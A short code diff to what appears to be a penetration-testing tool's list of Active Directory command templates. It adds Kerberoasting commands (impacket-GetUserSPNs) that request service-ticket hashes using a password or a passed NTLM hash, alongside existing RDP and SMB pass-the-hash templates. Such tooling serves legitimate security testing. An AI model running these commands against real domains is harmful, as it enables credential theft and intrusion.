@@ -26,6 +26,11 @@ const domainCommands: Command[] = [
   },
   {
     template:
+      "impacket-GetUserSPNs -request -dc-ip '{targetHost}' '{domain}'/'{username}':'{password}' -outputfile hashes.kerberoast",
+    authType: "password",
+  },
+  {
+    template:
       "xfreerdp /u:'{username}' /d:'{domain}' /p:'{password}' /v:'{targetHost}' /cert-ignore /dynamic-resolution",
     authType: "password",
   },
@@ -51,6 +56,11 @@ const domainCommands: Command[] = [
   {
     template:
       "impacket-smbclient '{domain}'/'{username}'@'{targetHost}' -hashes '00:{ntlmHash}'",
+    authType: "ntlmHash",
+  },
+  {
+    template:
+      "impacket-GetUserSPNs -request -dc-ip '{targetHost}' '{domain}'/'{username}' -hashes '00:{ntlmHash}' -outputfile hashes.kerberoast",
     authType: "ntlmHash",
   },
   {
